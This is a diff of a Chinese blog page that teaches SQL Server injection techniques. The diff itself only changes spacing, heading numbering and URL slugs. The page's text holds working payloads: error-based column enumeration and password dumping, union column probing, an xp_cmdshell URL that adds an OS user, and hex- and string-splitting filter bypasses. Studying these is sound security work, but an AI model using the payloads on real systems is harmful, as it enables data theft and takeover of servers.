@@ -111,18 +111,18 @@
 
 
 
-<meta name="description" content="针对SQL Server 2008、MySQL5.1和Oracle 11g三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
+<meta name="description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
 <meta name="keywords" content="SQL Injection">
 <meta property="og:type" content="article">
 <meta property="og:title" content="常见数据库注入技巧——SQL Server">
-<meta property="og:url" content="http://a2chitect.cn/2017/11/19/常见数据库注入技巧/index.html">
+<meta property="og:url" content="http://a2chitect.cn/2017/11/19/常见数据库注入技巧——SQL Server/index.html">
 <meta property="og:site_name" content="Architect&#39;s Blog">
-<meta property="og:description" content="针对SQL Server 2008、MySQL5.1和Oracle 11g三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
+<meta property="og:description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-19T09:11:31.955Z">
+<meta property="og:updated_time" content="2017-11-19T09:19:28.804Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="常见数据库注入技巧——SQL Server">
-<meta name="twitter:description" content="针对SQL Server 2008、MySQL5.1和Oracle 11g三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
+<meta name="twitter:description" content="针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。">
 
 
 
@@ -150,7 +150,7 @@
 
 
 
-  <link rel="canonical" href="http://a2chitect.cn/2017/11/19/常见数据库注入技巧/"/>
+  <link rel="canonical" href="http://a2chitect.cn/2017/11/19/常见数据库注入技巧——SQL Server/"/>
 
 
 
@@ -295,7 +295,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://a2chitect.cn/2017/11/19/常见数据库注入技巧/">
+    <link itemprop="mainEntityOfPage" href="http://a2chitect.cn/2017/11/19/常见数据库注入技巧——SQL Server/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Architect">
@@ -394,18 +394,18 @@
       
 
       
-        <p>针对SQL Server 2008、MySQL5.1和Oracle 11g三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。</p>
+        <p>针对 SQL Server 2008、MySQL5.1 和 Oracle 11g 三种数据库，简单归纳注入技巧。本篇为第一部分——SQL Server。</p>
 <a id="more"></a>
-<h3 id="1-SQL-Server"><a href="#1-SQL-Server" class="headerlink" title="1. SQL Server"></a>1. SQL Server</h3><h4 id="1-1-通过报错提取信息"><a href="#1-1-通过报错提取信息" class="headerlink" title="1.1 通过报错提取信息"></a>1.1 通过报错提取信息</h4><p>SQL Server的错误提示十分详细，可以通过引发报错提取需要的信息。</p>
-<h5 id="（1）通过having子句枚举表和列"><a href="#（1）通过having子句枚举表和列" class="headerlink" title="（1）通过having子句枚举表和列"></a>（1）通过having子句枚举表和列</h5><p>假设数据库结构和查询语句如下：</p>
+<h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><h4 id="通过报错提取信息"><a href="#通过报错提取信息" class="headerlink" title="通过报错提取信息"></a>通过报错提取信息</h4><p>SQL Server 的错误提示十分详细，可以通过引发报错提取需要的信息。</p>
+<h5 id="通过-having-子句枚举表和列"><a href="#通过-having-子句枚举表和列" class="headerlink" title="通过 having 子句枚举表和列"></a>通过 having 子句枚举表和列</h5><p>假设数据库结构和查询语句如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//表结构</div><div class="line">create table users（</div><div class="line">	id int not null identity(1,1),</div><div class="line">	username varchar(20) not null,</div><div class="line">	password varchar(20) not null,</div><div class="line">	privs int not null,</div><div class="line">	email varchar(50)</div><div class="line">)</div><div class="line"></div><div class="line">//查询语句</div><div class="line">select * from users where username=&apos;root&apos;</div></pre></td></tr></table></figure>
-<p>注入<code>&#39;having 1=1--</code>语句，由于SQL语言中having子句用于过滤组，因此会返回类似如下的错误：</p>
+<p>注入<code>&#39;having 1=1--</code>语句，由于SQL语言中 having 子句用于过滤组，因此会返回类似如下的错误：</p>
 <p><strong>“选择列表中的列“users.id”无效，因为该列未包含在聚合函数或 GROUP BY 子句中。”</strong></p>
-<p>得到表名users和其中的列名ID。</p>
+<p>得到表名 users 和其中的列名ID。</p>
 <p>将 user.id 包含在 group by 子句中，即<code>&#39; group by users.id having 1=1--</code>,再次注入，返回报错：</p>
 <p><strong>“选择列表中的列“users.username”无效，因为该列未包含在聚合函数或 GROUP BY 子句中。”</strong></p>
 <p>得到第二个列名。依此类推，即可枚举当前表中所有列名。</p>
-<h5 id="（2）利用数据类型错误提取数据"><a href="#（2）利用数据类型错误提取数据" class="headerlink" title="（2）利用数据类型错误提取数据"></a>（2）利用数据类型错误提取数据</h5><p>最常用的数据类型错误即是数字与字符串的类型错误。在 SQL Server 中，当将字符串与非字符串比较或者试图将字符串转换为不兼容类型时会抛出异常。有趣的是报错中会把涉及的字符串完整地输出。可以用几种方式来实现：</p>
+<h5 id="利用数据类型错误提取数据"><a href="#利用数据类型错误提取数据" class="headerlink" title="利用数据类型错误提取数据"></a>利用数据类型错误提取数据</h5><p>最常用的数据类型错误即是数字与字符串的类型错误。在 SQL Server 中，当将字符串与非字符串比较或者试图将字符串转换为不兼容类型时会抛出异常。有趣的是报错中会把涉及的字符串完整地输出。可以用几种方式来实现：</p>
 <ol>
 <li>嵌入子查询</li>
 </ol>
@@ -420,7 +420,7 @@
 <p>可以使用 FOR XML PATH 语句将查询的数据生成XML，代替重复递归操作：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from users where username=&apos;root&apos; and password=&apos;root&apos; and</div><div class="line">	1=CONVERT(int, (select stuff((select &apos;,&apos;+ users.username,&apos;|&apos; + users.password from users for xml path(&apos;&apos;)),1,1,&apos;&apos;)))</div></pre></td></tr></table></figure>
 <p>抛出异常：<strong>“在将 nvarchar 值 ‘root|root,admin|admin,xxser|xxser’ 转换成数据类型 int 时失败。” </strong></p>
-<h4 id="1-2-获取元数据"><a href="#1-2-获取元数据" class="headerlink" title="1.2 获取元数据"></a>1.2 获取元数据</h4><p>SQL Server 中常见的系统数据库视图见下表。</p>
+<h4 id="获取元数据"><a href="#获取元数据" class="headerlink" title="获取元数据"></a>获取元数据</h4><p>SQL Server 中常见的系统数据库视图见下表。</p>
 <table>
 <thead>
 <tr>
@@ -465,16 +465,16 @@
 </table>
 <p>从这些视图中可以获得有价值的元数据，例如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//获得当前数据库的表名</div><div class="line">select table_name from information_schema.tables</div><div class="line">//获得当前表的列名</div><div class="line">select column_name from information_schema.columns where table_name=&apos;student&apos;</div></pre></td></tr></table></figure>
-<h4 id="1-3-Order-by-子句"><a href="#1-3-Order-by-子句" class="headerlink" title="1.3 Order by 子句"></a>1.3 Order by 子句</h4><p>Order by 子句常用于探测表的列数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//正常语句</div><div class="line">select id,username,password from users where id=1</div><div class="line"></div><div class="line">//不断增加ORDER BY后面的列标号</div><div class="line">select id,username,password from users where id=1 order by 1</div><div class="line">select id,username,password from users where id=1 order by 2</div><div class="line">select id,username,password from users where id=1 order by 3</div><div class="line">......</div></pre></td></tr></table></figure>
-<p>假设users表共有三列，则当 order by 4 时就会报错：</p>
+<h4 id="Order-by-子句"><a href="#Order-by-子句" class="headerlink" title="Order by 子句"></a>Order by 子句</h4><p>Order by 子句常用于探测表的列数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//正常语句</div><div class="line">select id,username,password from users where id=1</div><div class="line"></div><div class="line">//不断增加 ORDER BY 后面的列标号</div><div class="line">select id,username,password from users where id=1 order by 1</div><div class="line">select id,username,password from users where id=1 order by 2</div><div class="line">select id,username,password from users where id=1 order by 3</div><div class="line">......</div></pre></td></tr></table></figure>
+<p>假设 users 表共有三列，则当 order by 4 时就会报错：</p>
 <p><strong>“ORDER BY 位置号 4 超出了选择列表中项数的范围”</strong></p>
-<h4 id="1-4-UNION-查询"><a href="#1-4-UNION-查询" class="headerlink" title="1.4 UNION 查询"></a>1.4 UNION 查询</h4><p>UNION 查询要遵循两个基本规则：</p>
+<h4 id="UNION-查询"><a href="#UNION-查询" class="headerlink" title="UNION 查询"></a>UNION 查询</h4><p>UNION 查询要遵循两个基本规则：</p>
 <ul>
 <li>所有查询中列数必须相同</li>
 <li>数据类型必须兼容</li>
 </ul>
-<h5 id="（1）union查询探测列数"><a href="#（1）union查询探测列数" class="headerlink" title="（1）union查询探测列数"></a>（1）union查询探测列数</h5><p>除了用 order by 语句推断列数外，还可以使用 union 查询：</p>
+<h5 id="union-查询探测列数"><a href="#union-查询探测列数" class="headerlink" title="union 查询探测列数"></a>union 查询探测列数</h5><p>除了用 order by 语句推断列数外，还可以使用 union 查询：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//正常语句</div><div class="line">select id,username,password from users where id=1</div><div class="line"></div><div class="line">//不断增加ORDER BY后面的列标号</div><div class="line">select id,username,password from users where id=1 union select null</div><div class="line">select id,username,password from users where id=1 union select null,null</div><div class="line">select id,username,password from users where id=1 union select null,null,null</div><div class="line">......</div></pre></td></tr></table></figure>
 <p>若 null 的数量与表中字段数不同，则会报错：<br><strong>“使用 UNION、INTERSECT 或 EXCEPT 运算符合并的所有查询必须在其目标列表中有相同数目的表达式”</strong></p>
 <ul>
@@ -482,12 +482,12 @@
 <p>null和其他任何数据类型都不会发生不兼容的情况，而数字型与其他类型（例如字符串）就会出现不兼容，因此推荐使用 null ；是否会出现类型异常也与数据库种类有关，MySQL中使用1,2,3…就不会出现异常，而 Oracle 和 SQL Server 则相反。</p>
 </li>
 </ul>
-<h5 id="（2）union-查询敏感信息"><a href="#（2）union-查询敏感信息" class="headerlink" title="（2）union 查询敏感信息"></a>（2）union 查询敏感信息</h5><p>假设已得知列数为 4，可以使用如下语句注入：</p>
+<h5 id="union-查询敏感信息"><a href="#union-查询敏感信息" class="headerlink" title="union 查询敏感信息"></a>union 查询敏感信息</h5><p>假设已得知列数为 4，可以使用如下语句注入：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">......id=1 union select &apos;x&apos;,null,null,null from sysobjects where xtype=&apos;U&apos;</div></pre></td></tr></table></figure>
 <p>如果第一行数据类型不匹配，数据库将会报错，可递归查询直至语句正常执行：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">......id=1 union select null,&apos;x&apos;,null,null from sysobjects where xtype=&apos;U&apos;</div><div class="line">......id=1 union select null,null,&apos;x&apos;,null from sysobjects where xtype=&apos;U&apos;</div><div class="line">......</div></pre></td></tr></table></figure>
 <p>语句执行正常，代表数据类型兼容，就可以将 x 换为 SQL 语句，查询敏感信息。</p>
-<h4 id="1-5-利用系统函数"><a href="#1-5-利用系统函数" class="headerlink" title="1.5 利用系统函数"></a>1.5 利用系统函数</h4><p>所有的数据库系统都会提供很多内置的系统函数，这些函数中有些可以直接返回数据库名、用户名等敏感信息，有些可以对数据进行处理（例如：字符串连接、截取；ASCII码转换等）。这些系统函数为 SQL 注入提供了很大的便利。</p>
+<h4 id="利用系统函数"><a href="#利用系统函数" class="headerlink" title="利用系统函数"></a>利用系统函数</h4><p>所有的数据库系统都会提供很多内置的系统函数，这些函数中有些可以直接返回数据库名、用户名等敏感信息，有些可以对数据进行处理（例如：字符串连接、截取；ASCII码转换等）。这些系统函数为 SQL 注入提供了很大的便利。</p>
 <p>SQL Server 中的常用函数表如下：</p>
 <table>
 <thead>
@@ -551,12 +551,12 @@
 </tr>
 </tbody>
 </table>
-<h4 id="1-6-利用存储过程"><a href="#1-6-利用存储过程" class="headerlink" title="1.6 利用存储过程"></a>1.6 利用存储过程</h4><p>存储过程（Stored Procedure）是在大型数据库系统中为完成特定功能的一组 SQL 语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p>
+<h4 id="利用存储过程"><a href="#利用存储过程" class="headerlink" title="利用存储过程"></a>利用存储过程</h4><p>存储过程（Stored Procedure）是在大型数据库系统中为完成特定功能的一组 SQL 语句集，存储在数据库中，经过第一次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p>
 <p>常见的存储过程功能有：执行系统命令、查看注册表、读取磁盘目录等。</p>
 <p>攻击者最常用的存储过程是 <code>xp_cmdshell</code> ,允许用户执行操作系统命令，例如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.secbug.org/test.aspx?id=1;exec xp_cmdshell &apos;net user test test /add&apos;</div></pre></td></tr></table></figure>
 <p>使用存储过程，必须先拥有相应的权限。</p>
-<h4 id="1-7-动态执行"><a href="#1-7-动态执行" class="headerlink" title="1.7 动态执行"></a>1.7 动态执行</h4><p>SQL Server 支持动态执行语句，用户可以提交一个字符串来执行 SQL 语句，例如：</p>
+<h4 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h4><p>SQL Server 支持动态执行语句，用户可以提交一个字符串来执行 SQL 语句，例如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">exec(&apos;select username,password from users&apos;)</div><div class="line"></div><div class="line">//绕过关键词过滤</div><div class="line">exec(&apos;selec&apos;+&apos;t userneme,password fro&apos;+&apos;m users&apos;)</div></pre></td></tr></table></figure>
 <p>可以通过定义十六进制的SQL语句，使用 exec 函数执行，可以绕过对单引号的过滤机制：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">declare @query varchar(888)</div><div class="line">select @query=0x73656C6563742031</div><div class="line">exec(@query)</div><div class="line"></div><div class="line">//以上命令连接起来</div><div class="line">declare/**/@query/**/varchar(888)/**/select/**/@query=0x73656C6563742031/**/exec(@query)</div></pre></td></tr></table></figure>
@@ -762,7 +762,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SQL-Server"><span class="nav-number">1.</span> <span class="nav-text">1. SQL Server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-通过报错提取信息"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 通过报错提取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（1）通过having子句枚举表和列"><span class="nav-number">1.1.1.</span> <span class="nav-text">（1）通过having子句枚举表和列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（2）利用数据类型错误提取数据"><span class="nav-number">1.1.2.</span> <span class="nav-text">（2）利用数据类型错误提取数据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-获取元数据"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 获取元数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-Order-by-子句"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 Order by 子句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4-UNION-查询"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 UNION 查询</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（1）union查询探测列数"><span class="nav-number">1.4.1.</span> <span class="nav-text">（1）union查询探测列数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（2）union-查询敏感信息"><span class="nav-number">1.4.2.</span> <span class="nav-text">（2）union 查询敏感信息</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-利用系统函数"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 利用系统函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-利用存储过程"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 利用存储过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-7-动态执行"><span class="nav-number">1.7.</span> <span class="nav-text">1.7 动态执行</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Server"><span class="nav-number">1.</span> <span class="nav-text">SQL Server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过报错提取信息"><span class="nav-number">1.1.</span> <span class="nav-text">通过报错提取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#通过-having-子句枚举表和列"><span class="nav-number">1.1.1.</span> <span class="nav-text">通过 having 子句枚举表和列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用数据类型错误提取数据"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用数据类型错误提取数据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取元数据"><span class="nav-number">1.2.</span> <span class="nav-text">获取元数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Order-by-子句"><span class="nav-number">1.3.</span> <span class="nav-text">Order by 子句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION-查询"><span class="nav-number">1.4.</span> <span class="nav-text">UNION 查询</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#union-查询探测列数"><span class="nav-number">1.4.1.</span> <span class="nav-text">union 查询探测列数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#union-查询敏感信息"><span class="nav-number">1.4.2.</span> <span class="nav-text">union 查询敏感信息</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用系统函数"><span class="nav-number">1.5.</span> <span class="nav-text">利用系统函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用存储过程"><span class="nav-number">1.6.</span> <span class="nav-text">利用存储过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#动态执行"><span class="nav-number">1.7.</span> <span class="nav-text">动态执行</span></a></li></ol></li></ol></div>
             
 
           </div>
